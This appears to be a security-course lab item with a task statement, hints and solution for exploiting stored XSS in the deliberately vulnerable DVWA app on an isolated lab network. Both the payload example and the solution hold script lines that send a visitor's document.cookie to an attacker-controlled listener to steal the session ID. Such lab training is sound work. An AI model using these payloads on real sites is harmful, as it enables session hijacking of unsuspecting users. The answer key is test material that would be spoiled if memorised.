title: XSS Cookie Stealing
description: Perform Stored XSS on DVWA to steal a cookie.
problemStatement:
# Objective
Exploit the Stored XSS vulnerability in DVWA to capture a visitor's session cookie.

## Setup
1.  Start a Python HTTP server on Kali: `python3 -m http.server 8000`
2.  Log in to DVWA and set security to **Low**.
3.  Navigate to **XSS (Stored)**.

## Steps
1.  Craft a payload that sends `document.cookie` to your Kali server.
2.  Inject the payload into the Guestbook (Name or Message field).
3.  Wait for the page to load (simulate a victim viewing the page).
4.  Check your HTTP server logs for the incoming request with the cookie.

## Payload Example
```html
<script>fetch('http://[Kali_IP]:8000/?c='+document.cookie)</script>
```

## Deliverable
Screenshot of the HTTP server log showing the captured `PHPSESSID`.
hints: Ensure your Kali IP is reachable from Metasploitable (same Host-Only network).
solutionCode:
# Kali Terminal 1:
python3 -m http.server 8000

# In DVWA XSS (Stored) Name field:
<script>new Image().src="http://192.168.56.102:8000/?c="+document.cookie</script>

# Sign the guestbook, then reload the page. Check Kali terminal for the request.
